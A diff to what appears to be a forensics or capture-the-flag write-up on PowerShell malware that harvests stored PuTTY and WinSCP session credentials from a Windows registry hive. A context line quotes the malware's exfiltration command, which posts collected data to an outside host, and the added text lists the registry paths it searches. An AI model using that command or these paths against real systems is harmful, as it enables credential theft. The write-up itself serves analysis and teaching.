@@ -117,4 +117,19 @@ Invoke-WebRequest -uri http://rlwmw.invalid:8080 -Method Post -Body $global:log
 Now knowing that the malware is searching for unsecure keys stored on the machine, we must look at the included NTUSER registry file to see if any keys are not encrypted.
 
 ### Understand Windows Registry
+
+The first step to examine the Registry is to know how to open the file. After research, I was able to load the hive onto my machine and was ready to see what the malware touched. Following the path in the malware, I was albe to see that there was a decent amount of files that the malware examined. 
+
+```
+$PuTTYPathEnding = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
+$WinSCPPathEnding = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
+```
+
+![image](https://user-images.githubusercontent.com/94944325/145702185-36260c1c-2458-4dc1-99ce-eb84cb5d11fb.png)
+
+Looking into the registry, we were able to narrow down the list of keys we needed to find that could be unencrypted.
+![image](https://user-images.githubusercontent.com/94944325/145702220-e11866e9-264f-4a22-8ace-248b463eba21.png)
+![image](https://user-images.githubusercontent.com/94944325/145702234-fc112f06-a083-4d61-a894-afe4fc4ad68d.png)
+
+
 ### Determine Comprimise
